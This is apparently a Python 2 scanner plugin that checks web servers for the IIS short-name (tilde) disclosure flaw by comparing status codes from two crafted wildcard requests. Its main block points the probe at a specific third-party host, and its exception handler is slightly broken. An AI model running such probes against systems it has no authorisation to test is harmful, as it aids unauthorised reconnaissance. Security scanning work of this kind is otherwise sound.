#!/usr/bin/env python
# encoding: utf-8
from t import T
import re
import urllib2,requests,urllib2,json,urlparse
requests.packages.urllib3.disable_warnings()




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo='',verify=False):
        timeout=5
        if int(port) == 443:
            protocal = "https"
        else:
            protocal = "http"
        target_url = protocal + "://"+ip+":"+port


        result = {}
        result['result']=False
        r=None
        s=None
        try:

            r=requests.get(url=target_url+'/*~1****/a.aspx',timeout=timeout,allow_redirects=False)
            status_1=r.status_code
            s=requests.get(url=target_url+'/l1j1e*~1****/a.aspx',timeout=timeout,allow_redirects=False)
            status_2=s.status_code
            #print target_url
            if status_1 == 404 and status_2 == 400:
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='iis short name Vulnerability'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']= 'null'
                result['VerifyInfo']['level']= 'warning'
                result['VerifyInfo']['result'] =r.content
        except Exception,e:
            #print '[-]error',
            print e.text
            #pass
            #print traceback.print_exc()
        finally:
            closeitem(r)
            closeitem(s)
            return result
def closeitem(instance):
    if instance is not None:
        instance.close()
        del instance


if __name__ == '__main__':
    print P().verify(ip='cos.99.com',port='80')

